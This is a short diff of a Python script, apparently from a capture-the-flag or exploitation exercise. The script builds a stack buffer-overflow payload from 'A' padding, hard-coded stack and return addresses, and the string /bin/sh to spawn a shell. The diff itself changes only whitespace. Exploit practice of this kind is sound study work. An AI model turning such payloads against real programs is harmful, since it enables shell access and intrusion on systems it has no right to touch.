@@ -16,9 +16,9 @@ from struct import pack
 sys.stdout.buffer.write(bytes.fromhex('41' * 10))
 sys.stdout.buffer.write(pack("<I", 0xfffee890))
 sys.stdout.buffer.write(bytes.fromhex('41' * 4))
-sys.stdout.buffer.write(pack("<I",0xfffee898))
+sys.stdout.buffer.write(pack("<I", 0xfffee898))
 sys.stdout.buffer.write(pack("<I", 0x08049d16))
 sys.stdout.buffer.write(pack("<I", 0xfffee8a0))
-sys.stdout.buffer.write(bytes.fromhex('41'*12))
+sys.stdout.buffer.write(bytes.fromhex('41' * 12))
 sys.stdout.buffer.write(b"/bin/sh")
 
